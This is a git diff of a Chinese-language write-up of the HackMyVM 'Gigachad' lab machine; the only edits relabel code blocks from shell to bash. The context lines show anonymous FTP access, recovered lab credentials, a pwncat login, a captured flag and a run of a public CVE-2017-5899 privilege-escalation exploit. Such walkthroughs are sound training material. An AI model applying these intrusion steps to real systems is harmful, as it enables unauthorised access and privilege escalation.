@@ -71,7 +71,7 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## ftp 服务存在匿名登陆
 
-```shell
+```bash
 ┌─[✗]─[randark@randark-Parrot]─[~]
 └──╼ $ftp 192.168.56.113
 Connected to 192.168.56.113.
@@ -94,7 +94,7 @@ ftp>
 
 将 `chadinfo` 文件下载到本地，发现为 zip 压缩文件
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Gigachad]
 └──╼ $file chadinfo
 chadinfo: Zip archive data, at least v1.0 to extract
@@ -102,7 +102,7 @@ chadinfo: Zip archive data, at least v1.0 to extract
 
 解压后得到
 
-```shell
+```bash
 why yes,
 #######################
 username is chad
@@ -139,7 +139,7 @@ chad:maidenstower
 
 尝试登录
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Gigachad]
 └──╼ $pwncat-cs chad@192.168.56.113
 [21:07:34] Welcome to pwncat 🐈!                                                                                                                         __main__.py:164
@@ -153,7 +153,7 @@ chad
 
 ## user pwned
 
-```shell
+```bash
 (remote) chad@gigachad:/home/chad$ cat user.txt
 0FAD8F4B099A26E004376EAB42B6A56A
 ```
@@ -189,7 +189,7 @@ chad
 
 使用 poc：`https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh`
 
-```shell
+```bash
 (remote) chad@gigachad:/home/chad$ chmod +x s-nail-privsep_CVE-2017-5899.sh 
 (remote) chad@gigachad:/home/chad$ ./s-nail-privsep_CVE-2017-5899.sh 
 ......
